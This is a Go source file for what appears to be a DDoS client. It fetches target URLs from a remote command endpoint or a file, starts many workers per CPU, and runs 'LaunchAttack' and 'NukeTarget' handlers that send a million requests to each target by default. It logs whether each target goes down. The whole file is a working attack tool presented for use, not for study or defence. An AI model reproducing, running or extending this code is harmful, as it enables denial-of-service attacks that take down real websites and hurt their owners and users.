package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	logw "github.com/andriiyaremenko/logwriter"
	"github.com/andriiyaremenko/logwriter/color"
	"github.com/andriiyaremenko/mg/client"
	"github.com/andriiyaremenko/mg/handler"
	"github.com/andriiyaremenko/mg/source"
	"github.com/andriiyaremenko/tinycqs/command"
)

func main() {
	t := flag.String("t", "endpoint", "source type to use (file or endpoint)")
	s := flag.String("s", "https://api.itemstolist.top/api/target", "url to endpoint or file name")
	q := flag.Int("q", 2, "log verbosity level")
	workersPerCore := flag.Int("w", 10, "number of workers per logical CPU")
	amountRequests := flag.Int64("n", 1000000, "number of requests per each target")

	flag.Parse()

	ctx := context.Background()
	ctx, cancel := context.WithCancel(ctx)

	log := log.New(
		logw.LogWriter(ctx, os.Stdout, logw.Option(*q, logw.JSONFormatter, time.RFC3339)),
		"",
		log.Lmsgprefix,
	)

	numWorkers := *workersPerCore * runtime.NumCPU()

	var targetSource source.Source
	switch *t {
	case "file":
		targetSource = source.GetFromFile(*s)
		log.Printf("reading from file %s", *s)
	case "endpoint":
		targetSource = source.GetFromEndpoint(client.New(), *s)
		log.Printf("reading from endpoint %s", *s)
	default:
		log.Fatalln(logw.Error.WithMessage("source type %s is unsupported", *t))
	}

	comm, err := command.NewWithConcurrencyLimit(
		numWorkers,
		handler.LaunchAttack(numWorkers),
		handler.NukeTarget(*amountRequests),
		handler.TargetDown(log),
		handler.TargetAlive(log),
		handler.TargetError(log),
		handler.HandleErrors(log),
	)

	if err != nil {
		log.Fatalln(logw.Error, err)
	}

	c := make(chan os.Signal, 1)

	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c

		cancel()

		log.Println("shutting down...")
		os.Exit(1)
	}()

	callBack := func(w command.CommandsWorker, e command.Event) {
		log.Println(logw.Level(0), string(e.Payload()))

	readSource:
		select {
		case <-ctx.Done():
			return
		default:
		}

		target, keep, err := targetSource()

		if err != nil {
			log.Println(logw.Error, err)
			time.Sleep(time.Second * 5)

			goto readSource
		}

		b, err := json.Marshal(target)
		if err != nil {
			log.Println(logw.Error, err)

			goto readSource
		}

		if !keep {
			return
		}

		log.Println(color.ColorizeText(color.ANSIColorGreen, fmt.Sprintf("launching an attack against %s", target.URL)))
		err = w.Handle(command.E{
			Type: "LAUNCH_ATTACK",
			P:    b,
		})
		if err != nil {
			log.Println(logw.Error, err)
		}
	}

	w := command.NewWorker(ctx, callBack, comm, 1)

readSource:
	target, _, err := targetSource()

	if err != nil {
		log.Println(logw.Error, err)
		time.Sleep(time.Second * 5)

		goto readSource
	}

	b, err := json.Marshal(target)
	if err != nil {
		log.Println(logw.Error, err)

		goto readSource
	}

	log.Println(color.ColorizeText(color.ANSIColorGreen, fmt.Sprintf("launching an attack against %s", target.URL)))
	err = w.Handle(command.E{
		Type: "LAUNCH_ATTACK",
		P:    b,
	})

	if err != nil {
		log.Println(logw.Error, err)
	}

	<-c
}
